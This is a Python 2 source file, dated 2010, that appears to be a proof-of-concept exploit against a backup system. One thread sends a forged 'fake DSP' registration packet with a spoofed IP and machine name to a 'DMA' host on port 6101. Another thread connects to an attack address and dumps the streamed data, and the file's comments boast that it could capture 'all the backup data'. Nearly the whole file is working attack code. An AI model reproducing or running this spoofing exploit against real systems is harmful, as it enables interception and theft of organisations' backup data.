'''
Created on 14-Jan-2010

@author: nibin
'''

from threading import Thread
import socket
import struct
import time
import sys

class dynamic_thread(Thread):


    def __init__(self, role, name, **kwargs):
        Thread.__init__(self)
        self.__kwargs = {}
        self.__role = role
        self.__kwargs = kwargs
        self.setName(name)
        
    
    def run(self):
        if(self.__role == "broadcast_fake_dsp"):
            self.fake_dsp()
        elif(self.__role == "start_data_client"):
            self.data_client()
    
    def print_data(self,data,PRINT=False):
        if PRINT:
            for x in  range(0,len(data)):
              if x%8 ==0:
                  print
              print "0x%02x" % struct.unpack("<B",data[x]),
            print 
    
    
    def fake_dsp(self):
        
        fake_ip = self.__kwargs.get("fake_ip")        
        nbname = self.__kwargs.get("dsp_nbname")
        dma_ip = self.__kwargs.get("dma_ip")
        print "Debug: %s" % dma_ip

        addr = (dma_ip, 6101)
        
        data = "\xbe\x01\x00\x41" + \
            "leng" + \
            "\x00\x0c\x00\x07" + \
            "dsp_name_size" + \
            "\x52\x54\x00\x00\x00\x00" + \
            "time" + \
            "\x00\x00\x0B\x49\x34" + \
            "fake_ip" 
        
        data += "\x27\x10\x18" #variable 
        data +=    "\x00\x14\x52\x50" + \
            "\x00\x00\x01\xF4" 
        data +=    "\x00\x01\x12\x03" #variable
        data +=    "\x00\x00\x00\x05" + \
            "\x00\x00\x00\x01" + \
            "\x00\x14\x52\x44" + \
            "\x00\x00\x00\x07" + \
            "\x00\x00\x00\x02" + \
            "\x00\x10\xc0\x82" + \
            "\x00\x00\x02\x80" + \
            "\x00\x18\x52\x4d" + \
            "\x00\x00\x00\x0c" + \
            "\x00\x00\x00\x05" + \
            "\x00\x00\x08\xA5" + \
            "\x00\x00\x00\x00" + \
            "\x00\x00\x00\xf0" + \
            "\x00\x08\x46\x4c" + \
            "\x00\x00\x00\x00"
        
        #RN = Windows        
        data = data.replace("dsp_name_size",struct.pack(">h", len(nbname)+4) + "RN" + nbname + "\x00\x0d" )
        data = data.replace("time", struct.pack(">L",time.time() ))
        data = data.replace("fake_ip", struct.pack("<B",int(fake_ip.split(".")[0])) + \
                            struct.pack("<B",int(fake_ip.split(".")[1])) + \
                            struct.pack("<B",int(fake_ip.split(".")[2])) + \
                            struct.pack("<B",int(fake_ip.split(".")[3])) )
        
        data = data.replace("leng", struct.pack(">L", len(data)))
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "[*] Sending fake DSP details to DMA"
        s.connect(addr)
        s.send(data)
        
    
    def data_client(self):
        attack_ip = self.__kwargs.get("attack_ip")        
        attack_port = self.__kwargs.get("attack_port")
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "[Data Client] Opening a stream %s:%s" % (attack_ip, attack_port)
        addr = (attack_ip, attack_port)
        s.connect(addr)
        #timeout 30 sec
        s.settimeout(30) 
        count = 0
        print "[Data Client] I will receive only 20 packets. This is a POC, not interested to attack"
        try:
            while count < 20:
                print "[Data Client]--"
                self.print_data(s.recv(1024), True)
                print "--[Data Client]"
                count+=1
        except socket.timeout:
            pass        
        finally:
            s.close()
        print "[Data Client] Received 20 packets. This is a POC, not interested to attack"
        print "If the stream is kept open, I will receive more data from DSP..All the backup data ;-) "
        raw_input("Hit any key to exit?")
        print("*********Game Over*********")
        sys.exit()


